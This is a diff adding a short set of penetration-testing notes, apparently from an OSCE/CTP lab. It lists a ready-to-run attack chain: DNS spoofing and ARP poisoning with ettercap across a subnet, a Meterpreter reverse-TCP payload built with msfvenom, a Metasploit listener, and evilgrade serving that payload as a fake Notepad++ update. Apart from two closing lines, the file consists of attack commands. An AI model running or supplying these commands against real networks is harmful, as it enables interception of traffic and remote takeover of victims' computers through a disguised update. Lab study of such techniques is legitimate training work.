@@ -1,0 +1,15 @@
+echo "notepad-plus.sourceforge.net A 192.168.100.145" >> /etc/ettercap/etter.dns
+ettercap -TqM arp:remote /192.168.100.1-254// /192.168.100.1-254//
+
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.100.145 LPORT=1234 -f exe
+
+msfconsole -x "use exploit/multi/handler set payload windows/x64/meterpreter_reverse_tcp; set lport 1234; set lhost 0.0.0.0; exploit"
+evilgrade > configure notepadplus
+evilgrade > show options
+evilgrade > set agent /root/Desktop/shell.exe
+evilgrade(notepadplus)>start
+
+
+Scripts I used during CTP
+
+These Noted were recorded during My CTP Lab time. these noted might be resourceful to anyone who prepare for OSCE Lab.
